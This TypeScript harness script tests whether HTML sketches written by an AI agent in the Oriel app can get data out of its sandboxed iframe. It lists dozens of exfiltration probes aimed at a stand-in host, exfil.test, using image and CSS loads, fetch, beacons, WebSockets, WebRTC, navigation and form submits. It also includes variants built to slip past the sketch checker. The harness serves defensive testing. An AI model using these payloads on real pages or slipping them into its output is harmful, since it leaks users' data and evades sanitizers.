// `pnpm sketch-frames`: decision 0033's loopback harness, run against
// Oriel's real window and its real sketch route, in the installed Chrome.
// It reaches nothing but 127.0.0.1.
//
// Each probe is HTML an agent might write to get something out: a fetch, a
// navigation, a lookup or a STUN packet. Every probe goes to a thread's
// agent as a sketch() call, in Oriel's real server. One the check refuses
// shows nothing. One it lets through is framed in the thread's page, from
// the sketch origin, and must reach nothing: no request, TCP connection or
// DNS lookup to the probe's host, no UDP packet, no popup, and no move of
// the page. A probe whose name starts with `click-` is clicked, inside the
// frame.
//
// Each probe also runs unprotected, as controls, so "reached nothing" means
// the probe would have fired: as a top-level page, in a frame with no
// sandbox, and in a frame sandboxed with no token, as Oriel's are, each in a
// page with no policy. The last is where scripts are off, so `<noscript>`
// is markup. A control the spike saw fire that no longer fires fails the
// run too, since then the harness proves nothing for it.
//
// Re-run it whenever Chrome's major version changes, and on the desktop
// shell's engine before it ships (decision 0033). It reads the clock, so it
// is a script, not a test. Over any leak, it exits 1.
import dgram from "node:dgram";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import http from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { chromium, type Browser } from "playwright-core";
import { checkSketch } from "../packages/core/src/sketch.ts";
import type { ThreadView } from "../packages/web/src/view.ts";
import { scriptedAgent } from "../packages/server/src/scripted-agent.ts";
import { serve } from "../packages/server/src/serve.ts";

const listen = (server: http.Server) =>
  new Promise<number>((resolve) =>
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      resolve(typeof address === "object" && address ? address.port : 0);
    }),
  );

// The sink: every request and every TCP connection, by Host.
const hits: { host: string; url: string; method: string }[] = [];
let connections = 0;
const sink = http.createServer((req, res) => {
  hits.push({ host: req.headers.host ?? "", url: req.url ?? "", method: req.method ?? "" });
  res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
  res.end("x");
});
sink.on("connection", () => (connections += 1));
const sinkPort = await listen(sink);
// STUN: any UDP datagram at all.
let datagrams = 0;
const stun = dgram.createSocket("udp4");
stun.on("message", () => (datagrams += 1));
await new Promise<void>((resolve) => stun.bind(0, "127.0.0.1", resolve));
const stunPort = stun.address().port;

// Each probe is named, and its HTML names its own host, `<probe>--<arm>`,
// so each arm's requests and lookups are its own.
type Probe = (at: (path?: string) => string, host: string) => string;
const svg64 = (svg: string) => Buffer.from(svg).toString("base64");
const probes: Record<string, Probe> = {
  img: (at) => `<img src="${at()}">`,
  srcset: (at) => `<img srcset="${at()} 1x">`,
  picture: (at) => `<picture><source srcset="${at()}"><img alt=""></picture>`,
  "css-bg-inline": (at) => `<div style="width:9px;height:9px;background:url(${at()})"></div>`,
  "css-bg-sheet": (at) =>
    `<style>div{width:9px;height:9px;background-image:url(${at()})}</style><div></div>`,
  "css-import": (at) => `<style>@import url(${at("a.css")});</style>`,
  "css-font": (at) =>
    `<style>@font-face{font-family:x;src:url(${at("f.woff")})}p{font-family:x}</style><p>text</p>`,
  "css-attr-selector": (at) =>
    `<input value="secret"><style>input[value^="s"]{background:url(${at("s")})}</style>`,
  "css-image-set": (at) =>
    `<style>div{width:9px;height:9px;background-image:image-set(url(${at()}) 1x)}</style><div></div>`,
  "css-cursor": (at) => `<style>body{cursor:url(${at()}),auto;height:99vh}</style>`,
  "css-list-style": (at) => `<style>li{list-style-image:url(${at()})}</style><ul><li>a</li></ul>`,
  "css-border-image": (at) =>
    `<style>div{border:9px solid;border-image:url(${at()}) 30}</style><div>x</div>`,
  "css-mask": (at) =>
    `<style>div{width:9px;height:9px;background:red;mask-image:url(${at()})}</style><div></div>`,
  "css-content": (at) => `<style>p::before{content:url(${at()})}</style><p>x</p>`,
  "css-filter": (at) => `<style>p{filter:url(${at("f.svg")}#f)}</style><p>x</p>`,
  "css-shape-outside": (at) =>
    `<style>div{float:left;width:9px;height:9px;shape-outside:url(${at()})}</style><div></div>x`,
  "svg-image": (at) =>
    `<svg width="9" height="9"><image href="${at()}" width="9" height="9"/></svg>`,
  "svg-use": (at) => `<svg width="9" height="9"><use href="${at("u.svg")}#a"/></svg>`,
  "svg-feimage": (at) =>
    `<svg width="9" height="9"><filter id="f"><feImage href="${at()}"/></filter><rect width="9" height="9" filter="url(#f)"/></svg>`,
  "link-stylesheet": (at) => `<link rel="stylesheet" href="${at("a.css")}">`,
  "link-prefetch": (at) => `<link rel="prefetch" href="${at()}">`,
  "link-preload": (at) => `<link rel="preload" as="image" href="${at()}">`,
  "link-preconnect": (_, host) => `<link rel="preconnect" href="http://${host}:${sinkPort}">`,
  "link-dns-prefetch": (_, host) => `<link rel="dns-prefetch" href="//${host}">`,
  "link-icon": (at) => `<link rel="icon" href="${at()}">`,
  "link-modulepreload": (at) => `<link rel="modulepreload" href="${at("m.js")}">`,
  "meta-refresh": (at) => `<meta http-equiv="refresh" content="0;url=${at()}">`,
  "meta-csp-loosen": (at) =>
    `<meta http-equiv="Content-Security-Policy" content="img-src *"><img src="${at()}">`,
  "base-href": (at) => `<base href="${at("")}"><img src="rel.png">`,
  object: (at) => `<object data="${at()}"></object>`,
  embed: (at) => `<embed src="${at()}">`,
  "iframe-src": (at) => `<iframe src="${at()}"></iframe>`,
  "iframe-srcdoc": (at) => `<iframe srcdoc="&lt;img src=&quot;${at()}&quot;&gt;"></iframe>`,
  "iframe-data": (at) => `<iframe src="data:text/html,%3Cimg src='${at()}'%3E"></iframe>`,
  "video-poster": (at) => `<video poster="${at()}"></video>`,
  "video-src": (at) => `<video src="${at()}" preload="auto"></video>`,
  "audio-src": (at) => `<audio src="${at()}" preload="auto"></audio>`,
  "speculation-rules": (at) =>
    `<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${at()}"]}]}</script>`,
  "script-fetch": (at) => `<script>fetch("${at()}")</script>`,
  "script-onerror": (at) => `<img src="data:," onerror="fetch('${at()}')">`,
  "svg-onload": (at) => `<svg onload="fetch('${at()}')"></svg>`,
  "script-beacon": (at) => `<script>navigator.sendBeacon("${at()}","x")</script>`,
  "script-websocket": (at, host) => `<script>new WebSocket("ws://${host}:${sinkPort}/ws")</script>`,
  "script-sse": (at) => `<script>new EventSource("${at()}")</script>`,
  "script-open": (at) => `<script>window.open("${at()}")</script>`,
  "script-top-nav": (at) => `<script>top.location="${at()}"</script>`,
  webrtc: () =>
    `<script>const pc=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:${stunPort}"}]});pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o))</script>`,
  // Attempts on the check's scan.
  "upper-iframe": (at) => `<IFRAME SRC="${at()}"></IFRAME>`,
  "slash-iframe": (at) => `<iframe/src="${at()}"></iframe>`,
  "ff-iframe": (at) => `<iframe\fsrc="${at()}"></iframe>`,
  "svg-style-iframe": (at) => `<svg><style><iframe src="${at()}"></iframe></style></svg>`,
  "comment-iframe": (at) => `<!-- <iframe src="${at()}"> -->`,
  "noscript-iframe": (at) => `<noscript><iframe src="${at()}"></iframe></noscript>`,
  "entity-iframe": (at) => `&lt;iframe src="${at()}"&gt;`,
  "image-tag": (at) => `<image src="${at()}">`,
  "img-data-svg": (at) =>
    `<img src="data:image/svg+xml,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" width="9" height="9"><image href="${at()}"/><foreignObject width="9" height="9"><iframe xmlns="http://www.w3.org/1999/xhtml" src="${at("fo")}"/></foreignObject></svg>`)}">`,
  "srcdoc-breakout": (at) => `"><img src="${at()}"><p x="`,
  "td-background": (at) => `<table><tr><td background="${at()}">x</td></tr></table>`,
  "button-formaction": (at) => `<button formaction="${at()}">go</button>`,
  "input-image": (at) => `<input type="image" src="${at()}">`,
  "use-external": (at) => `<svg><use href="${at("u.svg")}#a"/></svg>`,
  // A person clicks #go.
  "click-a-self": (at) => `<a id="go" href="${at()}">go</a>`,
  "click-a-blank": (at) => `<a id="go" href="${at()}" target="_blank">go</a>`,
  "click-a-top": (at) => `<a id="go" href="${at()}" target="_top">go</a>`,
  "click-a-parent": (at) => `<a id="go" href="${at()}" target="_parent">go</a>`,
  "click-a-ping": (at) => `<a id="go" href="#here" ping="${at("ping")}">go</a>`,
  "click-a-download": (at) => `<a id="go" href="${at()}" download>go</a>`,
  "click-svg-a": (at) =>
    `<svg width="60" height="30"><a id="go" href="${at()}"><rect width="60" height="30"/></a></svg>`,
  "click-form": (at) =>
    `<form action="${at()}"><input name="q" value="secret"><button id="go">go</button></form>`,
  "click-button-formaction": (at) => `<button id="go" formaction="${at()}">go</button>`,
  "click-use-data": (at) =>
    `<svg width="60" height="30"><use id="go" href="data:image/svg+xml;base64,${svg64(`<svg xmlns="http://www.w3.org/2000/svg"><a id="a" href="${at()}"><rect width="60" height="30"/></a></svg>`)}#a"/></svg>`,
  "click-use-local": (at) =>
    `<svg width="60" height="30"><defs><a id="a" href="${at()}"><rect width="60" height="30"/></a></defs><use id="go" href="#a"/></svg>`,
  "pattern-href-data": (at) =>
    `<svg width="60" height="30"><linearGradient id="g" href="data:image/svg+xml;base64,${svg64(`<svg xmlns="http://www.w3.org/2000/svg"><linearGradient id="t"><stop offset="0" stop-color="red"/></linearGradient><image href="${at()}"/></svg>`)}#t"/><rect width="60" height="30" fill="url(#g)"/></svg>`,
  "click-js-url": (at) => `<a id="go" href="javascript:fetch('${at()}')">go</a>`,
};

// Probes whose controls never fire, even unprotected, so they prove
// nothing here (decision 0033). The harness sees no connection or lookup
// from a preconnect or dns-prefetch; Chrome runs no speculation rules here,
// draws no external `use`, fetches no `filter` URL, follows no gradient's
// data: href, and draws nothing from a `use` of a data: SVG to click. And
// some are the scan's attempts that are only ever text (a comment, an
// escaped tag, an element inside SVG's `<style>`), an image that loads
// nothing, or a button with no form to send.
const silent = new Set([
  "link-preconnect",
  "link-dns-prefetch",
  "speculation-rules",
  "svg-use",
  "use-external",
  "css-filter",
  "pattern-href-data",
  "click-use-data",
  "svg-style-iframe",
  "comment-iframe",
  "entity-iframe",
  "img-data-svg",
  "button-formaction",
  "click-button-formaction",
]);

// Oriel's real server, whose agent sends each thread's message, a probe's
// name and arm, to sketch() in the real sandbox.
const sketchOf = new Map<string, string>();
const serving = await serve(0, {
  db: ":memory:",
  jira: { kind: "fixture" },
  agent: (deps) =>
    scriptedAgent(deps, (input) => [
      { run: `return await sketch(${JSON.stringify(sketchOf.get(input.text) ?? "")}, 240);` },
      { text: "Drawn." },
    ]),
});
const api = async <T>(path: string, body?: unknown): Promise<T> => {
  const reply = await fetch(new URL(path, serving.url), {
    method: body === undefined ? "GET" : "POST",
    headers: { origin: serving.url.slice(0, -1), "content-type": "application/json" },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
  });
  if (!reply.ok) throw new Error(`${path}: ${reply.status} ${await reply.text()}`);
  return (await reply.json()) as T;
};
const { id: workstream } = await api<{ id: string }>("/api/workstreams", {
  kind: "cluster",
  grouping: "epic",
  cluster: "10001",
});

// The controls' server: the probe as a page of its own, and a frame of it,
// with no sandbox or one with no token, in a page with no policy.
const controls = http.createServer((req, res) => {
  const url = new URL(req.url ?? "/", "http://x");
  const html = controlHtml.get(url.searchParams.get("tag") ?? "");
  if (html === undefined) return void res.writeHead(404).end();
  res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  res.end(
    url.pathname === "/framed"
      ? `<!doctype html><p>host</p><iframe ${url.searchParams.has("sandbox") ? 'sandbox="" ' : ""}width="600" height="200" src="/page?tag=${encodeURIComponent(url.searchParams.get("tag") ?? "")}"></iframe>`
      : `<!doctype html><meta charset="utf-8">${html}`,
  );
});
const controlHtml = new Map<string, string>();
const controlPort = await listen(controls);

const out = mkdtempSync(join(tmpdir(), "oriel-sketch-frames-"));
const netlog = join(out, "netlog.json");
const browser: Browser = await chromium.launch({
  channel: "chrome",
  chromiumSandbox: true,
  args: [
    `--host-resolver-rules=MAP *.exfil.test 127.0.0.1, EXCLUDE localhost`,
    `--log-net-log=${netlog}`,
  ],
});

type Seen = { leaks: string[]; note?: string };
const settleMs = 1200;

// Opens `url` and, for a click probe, clicks #go in `frames` nested frames.
async function watch(tag: string, url: string, frames: number, click: boolean): Promise<Seen> {
  const context = await browser.newContext();
  const page = await context.newPage();
  const popups: string[] = [];
  context.on("page", (opened) => popups.push(opened.url()));
  const before = { hits: hits.length, datagrams, connections };
  await page.goto(url);
  await page.waitForTimeout(400);
  let note: string | undefined;
  if (click) {
    let scope = page.locator(":root");
    let frame = page.frameLocator("iframe").first();
    for (let i = 1; i < frames; i++) frame = frame.frameLocator("iframe").first();
    if (frames > 0) scope = frame.locator(":root");
    await scope
      .locator("#go")
      .click({ timeout: 3000 })
      .catch((error: Error) => (note = `no click: ${error.message.split("\n")[0]}`));
  }
  await page.waitForTimeout(settleMs);
  const moved = page.url() !== url;
  await context.close();
  const requests = hits.slice(before.hits).filter((hit) => hit.host.startsWith(`${tag}.`));
  const tcp = connections - before.connections;
  const leaks = [
    ...requests.map((hit) => `${hit.method} ${hit.url}`),
    datagrams > before.datagrams ? `stun x${datagrams - before.datagrams}` : "",
    tcp && !requests.length && hits.length === before.hits ? `tcp x${tcp}` : "",
    moved ? "page moved" : "",
    popups.length ? "popup" : "",
  ].filter(Boolean);
  return note ? { leaks, note } : { leaks };
}

const results: { probe: string; arm: string; seen: Seen | "refused"; tag: string }[] = [];
for (const [name, probe] of Object.entries(probes)) {
  const click = name.startsWith("click-");
  for (const arm of ["top", "bare", "sandboxed"] as const) {
    const tag = `${name}--${arm}`;
    controlHtml.set(
      tag,
      probe((path = "x") => `http://${tag}.exfil.test:${sinkPort}/${path}`, `${tag}.exfil.test`),
    );
    const page = arm === "top" ? "page" : "framed";
    const sandbox = arm === "sandboxed" ? "&sandbox" : "";
    const url = `http://127.0.0.1:${controlPort}/${page}?tag=${encodeURIComponent(tag)}${sandbox}`;
    results.push({
      probe: name,
      arm,
      tag,
      seen: await watch(tag, url, arm === "top" ? 0 : 1, click),
    });
  }
  // Oriel: the probe as the agent's sketch, in a thread of its own.
  const tag = `${name}--oriel`;
  const html = probe(
    (path = "x") => `http://${tag}.exfil.test:${sinkPort}/${path}`,
    `${tag}.exfil.test`,
  );
  sketchOf.set(tag, html);
  const { id } = await api<{ id: string }>(`/api/workstreams/${workstream}/threads`, { text: tag });
  await serving.app.settled();
  const view = await api<ThreadView>(`/api/threads/${id}`);
  const shown = view.entries.some((entry) => entry.kind === "sketch");
  if (shown !== checkSketch(html).ok) throw new Error(`${name}: the turn and the check disagree`);
  results.push({
    probe: name,
    arm: "oriel",
    tag,
    seen: shown
      ? await watch(tag, new URL(`threads/${id}`, serving.url).href, 2, click)
      : "refused",
  });
}

// Height and theme: the frame is 240 pixels, a taller sketch scrolls in it,
// and the sheet follows the page's scheme.
sketchOf.set("theme", `<p>tall</p><div style="height:2000px"></div>`);
const { id: themed } = await api<{ id: string }>(`/api/workstreams/${workstream}/threads`, {
  text: "theme",
});
await serving.app.settled();
const looks: Record<string, unknown> = {};
for (const colorScheme of ["light", "dark"] as const) {
  const context = await browser.newContext({ colorScheme });
  const page = await context.newPage();
  await page.goto(new URL(`threads/${themed}`, serving.url).href);
  await page.frameLocator("iframe").first().frameLocator("iframe").locator("p").waitFor();
  const inner = page.frames().find((frame) => frame.url() === "about:srcdoc");
  looks[colorScheme] = await inner?.evaluate(`({
    background: getComputedStyle(document.body).backgroundColor,
    scrolls: document.scrollingElement.scrollHeight > innerHeight,
    height: innerHeight,
    origin: self.origin,
  })`);
  looks[`${colorScheme} sandbox`] = await page.evaluate(
    `document.querySelector(".answer-sketch iframe").getAttribute("sandbox")`,
  );
  await context.close();
}
await browser.close();
await serving.close();
sink.close();
controls.close();
stun.close();

const log = readFileSync(netlog, "utf8");
const problems: string[] = [];
const table: Record<string, Record<string, string>> = {};
for (const { probe, arm, tag, seen } of results) {
  const row = (table[probe] ??= {});
  if (seen === "refused") {
    row[arm] = "refused by the check";
    continue;
  }
  const leaks = [...seen.leaks, ...(log.includes(`${tag}.exfil.test`) ? ["dns"] : [])];
  row[arm] =
    `${leaks.length ? `fired: ${leaks.join(", ")}` : "nothing"}${seen.note ? ` (${seen.note})` : ""}`;
  if (arm === "oriel" && leaks.length)
    problems.push(`${probe} leaked through Oriel: ${leaks.join(", ")}`);
}
for (const [probe, row] of Object.entries(table)) {
  const fired = [row["top"], row["bare"], row["sandboxed"]].some((seen) =>
    seen?.startsWith("fired"),
  );
  if (!fired && !silent.has(probe))
    problems.push(`${probe}'s controls didn't fire, so it proves nothing`);
  if (fired && silent.has(probe))
    console.log(`${probe}'s controls fire now: drop it from \`silent\``);
}
const light = looks["light"] as
  | { background?: string; height?: number; scrolls?: boolean; origin?: string }
  | undefined;
const dark = looks["dark"] as typeof light;
if (!light || !dark || light.background === dark.background)
  problems.push("the frame's sheet doesn't follow the page's scheme");
if (light?.height !== 240 || !light.scrolls)
  problems.push("the frame isn't 240 pixels with a scroll");
if (light?.origin !== "null") problems.push(`the frame's origin is ${light?.origin}, not opaque`);
if (looks["light sandbox"] !== "") problems.push("the page's frame isn't sandboxed with no token");

console.log(JSON.stringify(table, null, 1));
console.log("frame:", JSON.stringify(looks));
console.log(`${Object.keys(probes).length} probes; results in ${out}`);
if (problems.length) {
  console.error(problems.join("\n"));
  process.exit(1);
}
rmSync(out, { recursive: true, force: true });
console.log("nothing got out");
process.exit(0);
